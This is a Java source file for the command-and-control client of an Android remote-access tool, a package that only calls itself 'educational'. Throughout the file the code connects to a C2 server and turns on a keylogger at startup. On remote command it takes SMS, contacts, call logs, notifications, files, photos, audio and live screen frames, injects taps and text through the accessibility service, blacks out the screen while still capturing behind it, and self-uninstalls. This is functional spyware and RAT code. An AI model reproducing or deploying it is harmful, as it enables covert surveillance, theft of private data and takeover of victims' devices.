package com.remoteaccess.educational.network;

import android.content.Context;
import android.graphics.Bitmap;
import android.os.Build;
import android.util.Base64;
import android.util.Log;
import com.remoteaccess.educational.advanced.NotificationInterceptor;
import com.remoteaccess.educational.commands.*;
import com.remoteaccess.educational.services.UnifiedAccessibilityService;
import com.remoteaccess.educational.utils.Constants;
import com.remoteaccess.educational.utils.DeviceInfo;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

/**
 * SocketManager — persistent TCP connection to the C2 server.
 *
 * Protocol (matches server.js exactly):
 *   send:    {"event":"...", "data":{...}}\n
 *   receive: {"event":"...", "data":{...}}\n
 */
public class SocketManager {

    private static final String TAG = "SocketManager";

    private static SocketManager instance;
    private Socket   tcpSocket;
    private PrintWriter    out;
    private BufferedReader in;
    private final Context  context;
    private volatile boolean connected = false;
    private volatile boolean running   = false;

    // Use a cached thread pool so command handlers never block the read loop
    private final ExecutorService          executor          = Executors.newCachedThreadPool();
    private final ScheduledExecutorService heartbeatExecutor = Executors.newSingleThreadScheduledExecutor();
    private ScheduledFuture<?>             heartbeatFuture;

    // Streaming state — event-driven (single-frame on request, idle keepalive)
    private volatile boolean idleFrameMode = false;
    private ScheduledFuture<?> idleFrameFuture;

    // Debounce handle for device-user interaction frames
    private final AtomicReference<ScheduledFuture<?>> actionFrameFuture = new AtomicReference<>();

    // Frame throttle — only one frame capture at a time; drop new requests while busy
    private final java.util.concurrent.atomic.AtomicBoolean frameBusy = new java.util.concurrent.atomic.AtomicBoolean(false);

    // Touch/swipe deduplication — ignore identical command within 250 ms
    private volatile String  lastTouchKey  = "";
    private volatile long    lastTouchTime = 0L;

    // Dynamic monitored packages (runtime additions from dashboard)
    private final java.util.Set<String> dynamicMonitoredPackages = new java.util.concurrent.CopyOnWriteArraySet<>();

    // Command Handlers — one instance each, created once and reused
    private final CommandExecutor   commandExecutor;
    private final SMSHandler        smsHandler;
    private final ContactsHandler   contactsHandler;
    private final CallLogsHandler   callLogsHandler;
    private final CameraHandler     cameraHandler;
    private final ScreenshotHandler screenshotHandler;
    private final FileHandler       fileHandler;
    private final AudioRecorder     audioRecorder;
    private final KeyloggerService  keyloggerService;
    private final AppMonitor        appMonitor;
    private final ScreenBlackout    screenBlackout;
    private final PermissionManager permissionManager;

    public static synchronized SocketManager getInstance(Context context) {
        if (instance == null) instance = new SocketManager(context.getApplicationContext());
        return instance;
    }

    private SocketManager(Context context) {
        this.context       = context;
        commandExecutor    = new CommandExecutor(context);
        smsHandler         = new SMSHandler(context);
        contactsHandler    = new ContactsHandler(context);
        callLogsHandler    = new CallLogsHandler(context);
        cameraHandler      = new CameraHandler(context);
        screenshotHandler  = new ScreenshotHandler(context);
        fileHandler        = new FileHandler(context);
        audioRecorder      = new AudioRecorder(context);
        keyloggerService   = new KeyloggerService(context);
        appMonitor         = new AppMonitor(context, keyloggerService);
        screenBlackout     = ScreenBlackout.getInstance(context);
        permissionManager  = new PermissionManager(context);
        // Auto-enable keylogger on init (will capture once accessibility is granted)
        KeyloggerService.setEnabled(true);
    }

    /** Expose appMonitor so UnifiedAccessibilityService can call it. */
    public AppMonitor getAppMonitor()       { return appMonitor; }
    public KeyloggerService getKeylogger()  { return keyloggerService; }

    /** Whether streaming is currently active (idle-frame mode on). */
    public boolean isStreamingActive() { return idleFrameMode && connected; }

    /**
     * Schedule a frame capture 200 ms after the last device-user interaction.
     * Resets the timer on each call so rapid interactions produce only one frame.
     */
    public void scheduleFrameAfterAction(String deviceId) {
        if (!isStreamingActive()) return;
        ScheduledFuture<?> prev = actionFrameFuture.getAndSet(null);
        if (prev != null) prev.cancel(false);
        ScheduledFuture<?> next = heartbeatExecutor.schedule(
            () -> sendSingleFrame(deviceId), 200, TimeUnit.MILLISECONDS);
        actionFrameFuture.set(next);
    }

    // ── Connection lifecycle ──────────────────────────────────────────────

    public synchronized void connect() {
        if (running) {
            Log.d(TAG, "connect() — already running, skipping");
            return;
        }
        running = true;
        executor.execute(this::connectionLoop);
    }

    private void connectionLoop() {
        while (running) {
            try {
                Log.i(TAG, "Connecting to " + Constants.TCP_HOST + ":" + Constants.TCP_PORT);
                tcpSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
                tcpSocket.setKeepAlive(true);
                tcpSocket.setSoTimeout(0);          // no read timeout — server sends pings

                out       = new PrintWriter(tcpSocket.getOutputStream(), true);
                in        = new BufferedReader(new InputStreamReader(tcpSocket.getInputStream()));
                connected = true;

                Log.i(TAG, "TCP connected — registering device");
                registerDevice(DeviceInfo.getDeviceId(context));
                startHeartbeat();
                listenForMessages();                // blocks until socket closes

            } catch (Exception e) {
                Log.e(TAG, "Connection error: " + e.getMessage());
            } finally {
                connected = false;
                stopHeartbeat();
                closeSilently();
            }

            if (running) {
                Log.d(TAG, "Reconnecting in " + Constants.TCP_RECONNECT_DELAY + " ms…");
                try { Thread.sleep(Constants.TCP_RECONNECT_DELAY); } catch (InterruptedException ignored) {}
            }
        }
        Log.i(TAG, "Connection loop ended");
    }

    private void closeSilently() {
        try { if (tcpSocket != null) tcpSocket.close(); } catch (Exception ignored) {}
        out = null;
        in  = null;
    }

    // ── Heartbeat ────────────────────────────────────────────────────────

    private void startHeartbeat() {
        stopHeartbeat();
        String deviceId = DeviceInfo.getDeviceId(context);
        heartbeatFuture = heartbeatExecutor.scheduleAtFixedRate(
            () -> { if (connected) sendHeartbeat(deviceId); },
            Constants.HEARTBEAT_INTERVAL,
            Constants.HEARTBEAT_INTERVAL,
            TimeUnit.MILLISECONDS
        );
    }

    private void stopHeartbeat() {
        if (heartbeatFuture != null) {
            heartbeatFuture.cancel(false);
            heartbeatFuture = null;
        }
    }

    // ── Message loop ──────────────────────────────────────────────────────

    private void listenForMessages() {
        try {
            String line;
            while (running && (line = in.readLine()) != null) {
                final String msg = line.trim();
                if (!msg.isEmpty()) executor.execute(() -> processMessage(msg));
            }
        } catch (Exception e) {
            Log.e(TAG, "Read error: " + e.getMessage());
        }
    }

    private void processMessage(String raw) {
        try {
            JSONObject json  = new JSONObject(raw);
            String     event = json.getString("event");
            JSONObject data  = json.optJSONObject("data");

            Log.d(TAG, "← event: " + event);

            switch (event) {
                case "device:ping":
                    sendPong();
                    break;

                case "device:registered":
                    Log.i(TAG, "Server acknowledged registration ✓");
                    break;

                case "command:execute":
                    if (data != null) {
                        String     commandId = data.optString("commandId", "");
                        String     command   = data.optString("command", "");
                        JSONObject params    = data.optJSONObject("params");
                        if (!command.isEmpty()) {
                            handleCommand(commandId, command, params);
                        }
                    }
                    break;

                default:
                    Log.w(TAG, "Unhandled event: " + event);
            }

        } catch (JSONException e) {
            Log.e(TAG, "Parse error: " + e.getMessage() + " raw=" + raw);
        }
    }

    // ── Send helpers ──────────────────────────────────────────────────────

    private synchronized void sendMessage(String event, JSONObject data) {
        if (out != null && connected) {
            try {
                JSONObject msg = new JSONObject();
                msg.put("event", event);
                msg.put("data", data);
                out.print(msg.toString() + "\n");
                out.flush();
            } catch (JSONException e) {
                Log.e(TAG, "sendMessage error: " + e.getMessage());
            }
        }
    }

    public void emit(String event, JSONObject data) { sendMessage(event, data); }

    private void sendPong() {
        try {
            JSONObject d = new JSONObject();
            d.put("deviceId", DeviceInfo.getDeviceId(context));
            sendMessage("device:pong", d);
        } catch (JSONException ignored) {}
    }

    public void registerDevice(String deviceId) {
        try {
            android.view.WindowManager wm = (android.view.WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            android.graphics.Point screenSize = new android.graphics.Point();
            wm.getDefaultDisplay().getRealSize(screenSize);

            JSONObject info = new JSONObject();
            info.put("name",           DeviceInfo.getDeviceName());
            info.put("model",          DeviceInfo.getModel());
            info.put("androidVersion", DeviceInfo.getAndroidVersion());
            info.put("manufacturer",   android.os.Build.MANUFACTURER);
            info.put("sdk",            Build.VERSION.SDK_INT);
            info.put("screenWidth",    screenSize.x);
            info.put("screenHeight",   screenSize.y);

            JSONObject d = new JSONObject();
            d.put("deviceId",   deviceId);
            d.put("userId",     "");
            d.put("deviceInfo", info);
            sendMessage("device:register", d);
            Log.d(TAG, "Registered device: " + deviceId);
        } catch (JSONException e) {
            Log.e(TAG, "registerDevice error: " + e.getMessage());
        }
    }

    public void sendHeartbeat(String deviceId) {
        try {
            JSONObject d = new JSONObject();
            d.put("deviceId", deviceId);
            sendMessage("device:heartbeat", d);
        } catch (JSONException ignored) {}
    }

    /** Send a command:response back to the server. result may be a JSONObject or a String. */
    public void sendResponse(String commandId, String command, Object result) {
        try {
            String responseStr;
            if (result instanceof JSONObject) {
                responseStr = result.toString();
            } else if (result != null) {
                responseStr = result.toString();
            } else {
                responseStr = "{}";
            }

            JSONObject d = new JSONObject();
            d.put("commandId", commandId);
            d.put("response",  responseStr);
            sendMessage("command:response", d);
            Log.d(TAG, "→ response sent for " + command);
        } catch (JSONException e) {
            Log.e(TAG, "sendResponse error: " + e.getMessage());
        }
    }

    private void sendErrorResponse(String commandId, String command, String error) {
        try {
            JSONObject d = new JSONObject();
            d.put("commandId", commandId);
            d.put("error",     error);
            sendMessage("command:response", d);
            Log.w(TAG, "→ error response for " + command + ": " + error);
        } catch (JSONException e) {
            Log.e(TAG, "sendErrorResponse error: " + e.getMessage());
        }
    }

    public void disconnect() {
        running   = false;
        connected = false;
        stopHeartbeat();
        closeSilently();
    }

    public boolean isConnected() { return connected; }

    // ── Command dispatch ──────────────────────────────────────────────────

    private void handleCommand(String commandId, String command, JSONObject params) {
        Log.i(TAG, "handleCommand: " + command + " [" + commandId + "]");
        JSONObject result;

        try {
            result = dispatchCommand(command, params);
        } catch (Exception e) {
            Log.e(TAG, "handleCommand exception for " + command + ": " + e.getMessage());
            sendErrorResponse(commandId, command, "Internal error: " + e.getMessage());
            return;
        }

        sendResponse(commandId, command, result);
    }

    private JSONObject dispatchCommand(String command, JSONObject params) throws Exception {
        if (params == null) params = new JSONObject();

        // ── System / Device ──────────────────────────────────────────────
        switch (command) {
            case "ping":
            case "vibrate":
            case "play_sound":
            case "get_clipboard":
            case "set_clipboard":
            case "get_device_info":
            case "get_location":
            case "get_installed_apps":
            case "get_battery_info":
            case "get_network_info":
            case "get_wifi_networks":
            case "get_system_info":
                return commandExecutor.executeCommand(command, params);
        }

        // ── Accessibility status ─────────────────────────────────────────
        if (command.equals("get_accessibility_status")) {
            JSONObject r = new JSONObject();
            boolean enabled = UnifiedAccessibilityService.getInstance() != null;
            r.put("success", true);
            r.put("enabled", enabled);
            r.put("message", enabled ? "Accessibility service is running" : "Accessibility service is NOT running — enable it in Settings");
            return r;
        }

        // ── SMS ──────────────────────────────────────────────────────────
        if (command.equals("get_all_sms")) {
            return smsHandler.getAllSMS(params.optInt("limit", 100));
        }
        if (command.equals("get_sms_from_number")) {
            return smsHandler.getSMSFromNumber(params.getString("phoneNumber"), params.optInt("limit", 50));
        }
        if (command.equals("send_sms")) {
            return smsHandler.sendSMS(params.getString("phoneNumber"), params.getString("message"));
        }
        if (command.equals("delete_sms")) {
            return smsHandler.deleteSMS(params.getString("smsId"));
        }

        // ── Contacts ─────────────────────────────────────────────────────
        if (command.equals("get_all_contacts")) return contactsHandler.getAllContacts();
        if (command.equals("search_contacts"))  return contactsHandler.searchContacts(params.getString("query"));

        // ── Calls ────────────────────────────────────────────────────────
        if (command.equals("get_all_call_logs")) {
            return callLogsHandler.getAllCallLogs(params.optInt("limit", 100));
        }
        if (command.equals("get_call_logs_by_type")) {
            return callLogsHandler.getCallLogsByType(params.getInt("callType"), params.optInt("limit", 50));
        }
        if (command.equals("get_call_logs_from_number")) {
            return callLogsHandler.getCallLogsFromNumber(params.getString("phoneNumber"), params.optInt("limit", 50));
        }
        if (command.equals("get_call_statistics")) return callLogsHandler.getCallStatistics();

        // ── Camera ───────────────────────────────────────────────────────
        if (command.equals("get_available_cameras")) return cameraHandler.getAvailableCameras();
        if (command.equals("take_photo")) {
            return cameraHandler.takePhoto(
                params.optString("cameraId", "0"),
                params.optString("quality", "high")
            );
        }

        // ── Screenshot ───────────────────────────────────────────────────
        if (command.equals("take_screenshot")) return screenshotHandler.takeScreenshot();

        // ── Files ────────────────────────────────────────────────────────
        if (command.equals("list_files")) {
            String path = params.optString("path", "");
            return fileHandler.listFiles(path.isEmpty() ? null : path);
        }
        if (command.equals("read_file"))  return fileHandler.readFile(params.getString("filePath"), params.optBoolean("asBase64", false));
        if (command.equals("write_file")) return fileHandler.writeFile(params.getString("filePath"), params.getString("content"), params.optBoolean("isBase64", false));
        if (command.equals("delete_file"))return fileHandler.deleteFile(params.getString("filePath"));
        if (command.equals("copy_file"))  return fileHandler.copyFile(params.getString("sourcePath"), params.getString("destPath"));
        if (command.equals("move_file"))  return fileHandler.moveFile(params.getString("sourcePath"), params.getString("destPath"));
        if (command.equals("create_directory")) return fileHandler.createDirectory(params.getString("path"));
        if (command.equals("get_file_info"))    return fileHandler.getFileInfo(params.getString("filePath"));
        if (command.equals("search_files"))     return fileHandler.searchFiles(params.getString("directory"), params.getString("query"));

        // ── Audio ────────────────────────────────────────────────────────
        if (command.equals("start_recording")) {
            String fn = params.optString("filename", null);
            return audioRecorder.startRecording(fn.isEmpty() ? null : fn);
        }
        if (command.equals("stop_recording"))       return audioRecorder.stopRecording();
        if (command.equals("get_recording_status")) return audioRecorder.getStatus();
        if (command.equals("get_audio"))            return audioRecorder.getAudioAsBase64(params.getString("filePath"));
        if (command.equals("list_recordings"))      return audioRecorder.listRecordings();
        if (command.equals("delete_recording"))     return audioRecorder.deleteRecording(params.getString("filePath"));

        // ── Keylogger ────────────────────────────────────────────────────
        if (command.equals("get_keylogs"))            return keyloggerService.getKeylogs(params.optInt("limit", 100));
        if (command.equals("clear_keylogs"))          return keyloggerService.clearKeylogs();
        if (command.equals("list_keylog_files"))      return keyloggerService.listKeylogFiles();
        if (command.equals("download_keylog_file"))   return keyloggerService.downloadKeylogFile(params.getString("date"));

        // ── App Monitor ──────────────────────────────────────────────────
        if (command.equals("list_app_monitor_apps"))    return appMonitor.listMonitoredApps();
        if (command.equals("get_app_keylogs"))          return appMonitor.getAppKeylogs(params.getString("packageName"), params.optString("date", ""), params.optInt("limit", 200));
        if (command.equals("list_app_keylog_files"))    return appMonitor.listAppKeylogFiles(params.getString("packageName"));
        if (command.equals("download_app_keylog_file")) return appMonitor.downloadAppKeylogFile(params.getString("packageName"), params.getString("date"));
        if (command.equals("list_app_screenshots"))     return appMonitor.listAppScreenshots(params.getString("packageName"));
        if (command.equals("download_app_screenshot"))  return appMonitor.downloadAppScreenshot(params.getString("packageName"), params.getString("filename"));

        // ── App Manager ──────────────────────────────────────────────────
        if (command.equals("uninstall_app"))  return appMonitor.uninstallApp(params.getString("packageName"));
        if (command.equals("force_stop_app")) return appMonitor.forceStopApp(params.getString("packageName"));
        if (command.equals("open_app"))       return appMonitor.openApp(params.getString("packageName"));
        if (command.equals("clear_app_data")) return appMonitor.clearAppData(params.getString("packageName"));
        if (command.equals("disable_app"))    return appMonitor.disableApp(params.getString("packageName"));

        // ── Notifications ────────────────────────────────────────────────
        if (command.equals("get_notifications"))          return NotificationInterceptor.getAllNotifications();
        if (command.equals("get_notifications_from_app")) return NotificationInterceptor.getNotificationsFromApp(params.getString("packageName"));
        if (command.equals("clear_notifications"))        return NotificationInterceptor.clearAllNotifications();

        // ── Streaming — event-driven ─────────────────────────────────────
        if (command.equals("stream_start")) {
            String deviceId = DeviceInfo.getDeviceId(context);
            startIdleFrameMode(deviceId);
            sendSingleFrame(deviceId); // send first frame immediately
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("message", "Event-driven stream started (idle keepalive every 5s)");
            return r;
        }
        if (command.equals("stream_stop")) {
            stopIdleFrameMode();
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("message", "Stream stopped");
            return r;
        }
        if (command.equals("stream_request_frame")) {
            String deviceId = DeviceInfo.getDeviceId(context);
            sendSingleFrame(deviceId);
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("message", "Frame captured and sent");
            return r;
        }

        // ── Screen Blackout ───────────────────────────────────────────────
        if (command.equals("screen_blackout_on")) {
            return screenBlackout.enableBlackout();
        }
        if (command.equals("screen_blackout_off")) {
            return screenBlackout.disableBlackout();
        }
        if (command.equals("get_blackout_status")) {
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("active", screenBlackout.isActive());
            r.put("message", screenBlackout.isActive() ? "Screen blackout is ON" : "Screen blackout is OFF");
            return r;
        }

        // ── get_permissions ──────────────────────────────────────────────
        if (command.equals("get_permissions")) {
            return permissionManager.getPermissions();
        }

        // ── Self-destruct ─────────────────────────────────────────────────
        if (command.equals("self_destruct")) {
            return performSelfDestruct();
        }

        // ── Dynamic app monitoring ────────────────────────────────────────
        if (command.equals("add_monitored_app")) {
            String pkg = params.optString("packageName", "");
            if (!pkg.isEmpty()) dynamicMonitoredPackages.add(pkg);
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("message", "Now monitoring: " + pkg);
            return r;
        }
        if (command.equals("remove_monitored_app")) {
            String pkg = params.optString("packageName", "");
            dynamicMonitoredPackages.remove(pkg);
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("message", "Stopped monitoring: " + pkg);
            return r;
        }

        // ── Permissions ───────────────────────────────────────────────────
        if (command.equals("request_permission")) {
            String perm = params.optString("permission", "");
            if (perm.isEmpty()) {
                JSONObject r = new JSONObject();
                r.put("success", false);
                r.put("error", "Missing 'permission' parameter");
                return r;
            }
            return permissionManager.requestPermission(perm);
        }
        if (command.equals("request_all_permissions")) {
            return permissionManager.requestAllPermissions();
        }

        // ── Accessibility-required commands ──────────────────────────────
        // Screen Control (gestures) + Screen Reader
        if (isAccessibilityCommand(command)) {
            return handleAccessibilityCommand(command, params);
        }

        // ── Unknown ──────────────────────────────────────────────────────
        JSONObject unknown = new JSONObject();
        unknown.put("success", false);
        unknown.put("error", "Unknown command: " + command);
        return unknown;
    }

    // ── Streaming — event-driven single-frame model ───────────────────────

    /** Send exactly one frame immediately. Drops the call if a frame is already being captured. */
    public void sendSingleFrame(String deviceId) {
        // Throttle: only one frame capture at a time — drop new requests while busy
        if (!frameBusy.compareAndSet(false, true)) {
            Log.d(TAG, "sendSingleFrame: dropped — previous frame still in progress");
            return;
        }
        executor.execute(() -> {
            try {
                Bitmap frame = captureFrame();
                if (frame != null) {
                    // Scale to max 320 px wide for faster transfer
                    Bitmap scaled = scaleBitmapToWidth(frame, 320);
                    if (scaled != frame) frame.recycle();
                    String b64 = bitmapToBase64(scaled, 40);
                    scaled.recycle();
                    if (b64 != null) {
                        JSONObject d = new JSONObject();
                        d.put("deviceId",  deviceId);
                        d.put("frameData", b64);
                        d.put("timestamp", System.currentTimeMillis());
                        sendMessage("stream:frame", d);
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "sendSingleFrame error: " + e.getMessage());
            } finally {
                frameBusy.set(false);
            }
        });
    }

    /** Scale a bitmap so its width is at most maxWidth; keeps aspect ratio. */
    private Bitmap scaleBitmapToWidth(Bitmap src, int maxWidth) {
        if (src == null || src.getWidth() <= maxWidth) return src;
        float ratio = (float) maxWidth / src.getWidth();
        int newH = Math.max(1, Math.round(src.getHeight() * ratio));
        return Bitmap.createScaledBitmap(src, maxWidth, newH, true);
    }

    /** Start idle-frame mode: send one frame every 5 seconds when idle. */
    private void startIdleFrameMode(String deviceId) {
        stopIdleFrameMode();
        idleFrameMode = true;
        idleFrameFuture = heartbeatExecutor.scheduleAtFixedRate(() -> {
            if (idleFrameMode && connected) sendSingleFrame(deviceId);
        }, 5, 5, TimeUnit.SECONDS);
        Log.i(TAG, "Idle-frame mode started (5s keepalive)");
    }

    private void stopIdleFrameMode() {
        idleFrameMode = false;
        if (idleFrameFuture != null) {
            idleFrameFuture.cancel(false);
            idleFrameFuture = null;
        }
    }

    private Bitmap captureFrame() {
        final Bitmap[] result = {null};

        Runnable doCapture = () -> {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
                if (svc != null) {
                    result[0] = svc.captureScreenSync();
                    return;
                }
            }
            try {
                result[0] = screenshotHandler.captureBitmap();
            } catch (Exception e) {
                Log.w(TAG, "captureFrame fallback failed: " + e.getMessage());
            }
        };

        // If blackout is active, briefly hide the overlay so dashboard sees real content
        if (screenBlackout.isActive()) {
            screenBlackout.runWithOverlayHidden(doCapture);
        } else {
            doCapture.run();
        }

        return result[0];
    }

    private String bitmapToBase64(Bitmap bitmap, int quality) {
        try {
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, out);
            return Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
        } catch (Exception e) {
            Log.e(TAG, "bitmapToBase64 error: " + e.getMessage());
            return null;
        }
    }

    private boolean isAccessibilityCommand(String command) {
        switch (command) {
            case "touch":
            case "swipe":
            case "press_back":
            case "press_home":
            case "press_recents":
            case "open_notifications":
            case "open_quick_settings":
            case "scroll_up":
            case "scroll_down":
            case "input_text":
            case "press_enter":
            case "click_by_text":
            case "read_screen":
            case "find_by_text":
            case "get_current_app":
            case "get_clickable_elements":
            case "get_input_fields":
                return true;
            default:
                return false;
        }
    }

    private JSONObject handleAccessibilityCommand(String command, JSONObject params) throws JSONException {
        UnifiedAccessibilityService accessSvc = UnifiedAccessibilityService.getInstance();

        if (accessSvc == null) {
            JSONObject r = new JSONObject();
            r.put("success", false);
            r.put("error",   "Accessibility service is not running. Enable it in Settings → Accessibility → " +
                             "Downloaded Apps → [App Name]");
            r.put("requiresAccessibility", true);
            return r;
        }

        // Screen Control commands (gestures)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            ScreenController sc = new ScreenController(accessSvc);

            switch (command) {
                case "touch": {
                    int tx = params.getInt("x");
                    int ty = params.getInt("y");
                    // Deduplication: ignore identical touch within 250 ms
                    String touchKey = "touch:" + tx + "," + ty;
                    long now = System.currentTimeMillis();
                    if (touchKey.equals(lastTouchKey) && (now - lastTouchTime) < 250) {
                        Log.d(TAG, "touch dedup ignored: " + touchKey);
                        JSONObject r = new JSONObject();
                        r.put("success", true);
                        r.put("deduped", true);
                        return r;
                    }
                    lastTouchKey  = touchKey;
                    lastTouchTime = now;
                    return sc.touch(tx, ty, params.optInt("duration", 100));
                }
                case "swipe":
                    return sc.swipe(
                        params.optInt("x1", params.optInt("startX", 0)),
                        params.optInt("y1", params.optInt("startY", 0)),
                        params.optInt("x2", params.optInt("endX", 0)),
                        params.optInt("y2", params.optInt("endY", 0)),
                        params.optInt("duration", 300)
                    );
                case "press_back":         return sc.pressBack();
                case "press_home":         return sc.pressHome();
                case "press_recents":      return sc.pressRecents();
                case "open_notifications": return sc.openNotifications();
                case "open_quick_settings":return sc.openQuickSettings();
                case "scroll_up":          return sc.scrollUp();
                case "scroll_down":        return sc.scrollDown();
                case "input_text":         return sc.inputText(params.getString("text"));
                case "press_enter":        return sc.pressEnter();
                case "click_by_text":      return sc.clickByText(params.getString("text"));
            }
        } else if (isGestureCommand(command)) {
            JSONObject r = new JSONObject();
            r.put("success", false);
            r.put("error", command + " requires Android 7.0+ (API 24)");
            return r;
        }

        // Screen Reader commands
        ScreenReader sr = new ScreenReader(accessSvc);
        switch (command) {
            case "read_screen":             return sr.readScreen();
            case "find_by_text":            return sr.findByText(params.getString("text"));
            case "get_current_app":         return sr.getCurrentApp();
            case "get_clickable_elements":  return sr.getClickableElements();
            case "get_input_fields":        return sr.getInputFields();
        }

        JSONObject r = new JSONObject();
        r.put("success", false);
        r.put("error", "Unhandled accessibility command: " + command);
        return r;
    }

    private boolean isGestureCommand(String command) {
        switch (command) {
            case "touch": case "swipe": case "scroll_up": case "scroll_down": return true;
            default: return false;
        }
    }

    /** Push a keylog entry to the server immediately (live feed). */
    public void pushKeylogEntry(String packageName, String appName, String text, String eventType, String timestamp) {
        executor.execute(() -> {
            try {
                JSONObject entry = new JSONObject();
                entry.put("packageName", packageName);
                entry.put("appName", appName != null ? appName : packageName);
                entry.put("text", text);
                entry.put("eventType", eventType);
                entry.put("timestamp", timestamp);
                entry.put("deviceId", DeviceInfo.getDeviceId(context));
                sendMessage("keylog:entry", entry);
            } catch (Exception e) {
                Log.e(TAG, "pushKeylogEntry error: " + e.getMessage());
            }
        });
    }

    /** Push a live notification to the server (relayed to dashboard). */
    public void pushNotification(String packageName, String appName, String title, String text, long postTime) {
        executor.execute(() -> {
            try {
                String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                        java.util.Locale.getDefault()).format(new java.util.Date(postTime));
                JSONObject entry = new JSONObject();
                entry.put("packageName", packageName);
                entry.put("appName", appName != null ? appName : packageName);
                entry.put("title", title != null ? title : "");
                entry.put("text", text != null ? text : "");
                entry.put("timestamp", ts);
                entry.put("postTime", postTime);
                entry.put("deviceId", DeviceInfo.getDeviceId(context));
                sendMessage("notification:entry", entry);
            } catch (Exception e) {
                Log.e(TAG, "pushNotification error: " + e.getMessage());
            }
        });
    }

    /** Push a foreground app change to the server (recent activity). */
    public void pushRecentActivity(String packageName, String appName) {
        executor.execute(() -> {
            try {
                String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                        java.util.Locale.getDefault()).format(new java.util.Date());
                JSONObject entry = new JSONObject();
                entry.put("packageName", packageName);
                entry.put("appName", appName != null ? appName : packageName);
                entry.put("timestamp", ts);
                entry.put("deviceId", DeviceInfo.getDeviceId(context));
                sendMessage("app:foreground", entry);
            } catch (Exception e) {
                Log.e(TAG, "pushRecentActivity error: " + e.getMessage());
            }
        });
    }

    /** Whether a package is monitored (static config OR dynamically added). */
    public boolean isDynamicallyMonitored(String pkg) {
        return dynamicMonitoredPackages.contains(pkg);
    }

    /** Self-destruct: clear data and launch uninstall flow. */
    private JSONObject performSelfDestruct() {
        JSONObject r = new JSONObject();
        try {
            // Schedule destruction after giving time to send the response
            new Thread(() -> {
                try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
                try {
                    // Enable uninstall-assist mode in accessibility
                    UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
                    if (svc != null) svc.enableUninstallAssist();

                    // Open uninstall dialog
                    android.content.Intent intent = new android.content.Intent(
                        android.content.Intent.ACTION_DELETE,
                        android.net.Uri.parse("package:" + context.getPackageName())
                    );
                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                } catch (Exception e) {
                    Log.e(TAG, "selfDestruct error: " + e.getMessage());
                }
            }).start();
            r.put("success", true);
            r.put("message", "Self-destruct initiated — uninstalling app");
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }
}
